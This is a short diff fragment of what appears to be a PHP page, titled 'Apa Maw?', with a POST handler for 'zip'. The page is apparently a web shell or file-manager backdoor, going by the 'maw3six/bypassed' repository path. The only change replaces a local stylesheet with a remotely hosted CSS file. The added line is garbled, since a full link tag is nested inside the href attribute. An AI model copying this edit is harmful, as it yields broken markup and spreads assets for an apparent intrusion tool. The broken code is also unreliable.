@@ -782,7 +782,7 @@ if (isset($_POST['zip'])) {
 <head>
     <title>Apa Maw?</title>
   <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/space-1/48/24-256.png">
-  <link rel="stylesheet" href="style.css">  
+  <link rel="stylesheet" href="<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/maw3six/maw3six/bypassed/ironman.css">">  
 </head>
 <body>
     <div class="container">
